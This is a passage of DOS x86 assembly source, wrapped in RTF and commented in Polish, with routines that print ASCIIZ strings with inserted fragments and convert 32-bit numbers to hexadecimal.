\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov bl,Pa_Nic                       ; "czyste" wyjscie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 jmp KopiujParamZnak                 ; wez nastepny znak}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ToPierwszyZnak:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov ah,al                           ; zachowaj pierwszy znak liczby}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov bh,1                            ; jest juz jeden znak}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 jmp KopiujParamZnak                 ; idz po nastepny znak}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch KoniecParamTekstu:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 cmp bx,Pa_Nic                       ; czy "czyste" wyjscie ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 je  KoniecParamTekstu2              ; jezeli nie, to blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 dec si                              ; zmniejsz wskaznik na poprzedni znak}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch KoniecParamTekstuBlad:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 stc                                 ; gdy CF=1, to nie ma bledu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 jmp $+3                             ; przeskocz 'CLC'}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch KoniecParamTekstu2:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 clc                                 ; gdy CF=0, to nie ma bledu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 ret                                 ; powrot z procedury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch KopiujCiagDoKonca endp}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;-------------------------------------------------------------------}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DrukLn          proc near                           ; drukowanie tekstu ACSIIZ spod DS:SI}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                                     ; z przejsciem do nastepnej linii}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 Call Druk                           ; wydrukuj tekst}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 push si                             ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov si,Offset TeCRLF                ;  \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 Call Druk                           ;   \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 pop si                              ; --- przejdz do nastepnej linii}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 ret                                 ; powrot z procedury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DrukLn          endp}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;-------------------------------------------------------------------}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Druk            proc near                           ; drukowanie tekstu ACSIIZ spod DS:SI}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 push ax                             ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 push bx                             ;  \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 push cx                             ;   \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 push si                             ; --- zachowaj zmieniane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       DrukZnak:                                     ; petla drukowania jednego znaku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 cmp si,offset CiagStart             ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 jb  ToNieParamtekst                 ;  \\     jezeli drukowany jest}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 cmp si,offset CiagKoniec            ;   \\    w obszarsze lancucha 'CiagBajtow'}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 jae  ToNieParamtekst                ;    \\   to pozwol drukowac kazdy znak}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov cx,AbsDlugoscCiagu              ;     \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 add cx,offset CiagStart             ;     /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 cmp si,cx                           ;    /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 jae KoniecDruku                     ;   /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 lodsb                               ;  /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 jmp short ToParamtekst              ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ToNieParamtekst:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 lodsb                               ; wez kolejny znak z lancucha}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 or al,al                            ; sprawdz, czy ostatni znak ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 jz KoniecDruku                      ; jesli tak, to wszystko wydrukowane}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov cx,IleWrostkow                  ; Ile zdefiniowanych wrostkow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov bx,Offset TablicaWrostkow       ; tablica z definicjami}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      SzukajWrostka:                                 ; -sprawdz, czy al nie oznacza wrostka}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 cmp ds:[bx],al                      ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 jne NastepnyWrostek                 ; jesli nie, to sprawdz nastepny w tablicy}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 test al,80h                         ; czy 7 bit ustawiony ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 jz NormalnyDruk                     ; nie - to ofset do tekstu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 Call ds:[bx+1]                      ; tak - to procedura konwersji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 xor al,al                           ; zeruj dla pozniejszego porownania}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 inc si                              ; - pomin ofset do liczby do konwrsji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 inc si                              ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 jmp short NastepnyWrostek           ; sprawdz nastepny wrostek w tablicy}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       NormalnyDruk:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 push si                             ; wrostek to tekst spod ofsetu w tablicy}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov si,ds:[bx+1]                    ; wrostkow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 Call Druk                           ; wyswietl wrostek}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 pop si}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 xor al,al                           ; zeruj dla pozniejszego porownania}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      NastepnyWrostek:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 add bx,3                            ; zwieksz index do tablicy wrostkow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 loop SzukajWrostka                  ; powtorz cx razy}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 or al,al                            ; czy to byl wrostek (al=0) ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 jz DrukZnak                         ; jesli tak, to wez nastepny znak}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ToParamtekst:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov ah,02h                          ; wyprowadz znak na}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov dl,al                           ; standardowe wyjscie DOSa}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 int 21h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 jmp short DrukZnak                  ; skocz i wez nastepny znak lancucha}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch KoniecDruku:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 pop si                              ;  --- przywroc zmienione rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 pop cx                              ;   /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 pop bx                              ;  /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 pop ax                              ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 ret                                 ; wracaj}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Druk            endp}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;-------------------------------------------------------------------}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Bin2HexUnInt32  proc near                           ; procedura wyswietla 32 bitowa liczbe szesnastkowa}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                                     ; ofset do liczby znajduje sie w si}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 push ax                             ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 push bx                             ;  \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 push dx                             ;   \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 push si                             ; --- zachowaj zmieniane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov bx,[si]                         ; wez ofset do liczby 32 bitowej}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov ax,[bx]                         ; - wczytaj liczbe do DX:AX}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov dx,[bx+2]                       ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov si,offset Hex2DecBufor          ; ustaw na poczatek bufora}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov bx,offset HexChars              ; wez ofset do tablicy z cyframi szesnastkowymi}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 push ax                             ; zapamietaj mniej znacz. slowo}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov ax,dx                           ; najpierw bar. znacz. slowo}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 Call Bin2HexUnInt16                 ; konwertuj liczbe 16 bitowa}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 pop ax                              ; przywroc mniej znacz. slowo}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 Call Bin2HexUnInt16                 ; terax mniej znacz. slowo}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov word ptr [si],'h'               ; ustaw na koncu znak 'h' i 0}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov si,offset Hex2DecBufor          ; - wyswietl liczbe}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 Call Druk                           ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 pop si                              ; --- przywroc zmienione rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 pop dx                              ;   /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 pop bx                              ;  /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 pop ax                              ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 ret                                 ; powrot}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Bin2HexUnInt16:                                     ; wewnetrzna procedura wywoluje "zstepujaco"}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                                     ; kolejne nizsze ranga procedury konwersji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 push ax}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov al,ah                           ; konwertuj b. znacz. czesc AX}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 Call Bin2HexUnInt8}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 pop ax                              ; konwertuj m. znacz. czesc AX}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Bin2HexUnInt8:  mov ah,al}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 shr al,1                            ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 shr al,1                            ;  \\ wyizoluj 4 bity (4..7)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 shr al,1                            ;  / al=gorna polowa liczby}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 shr al,1                            ; /     szesnastkowej}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 Call Bin2HexUnInt4                  ; konwertuj b. znacz. bity (4..7)}{\f2\fs24\lang1045{\*\listtag0}\par}
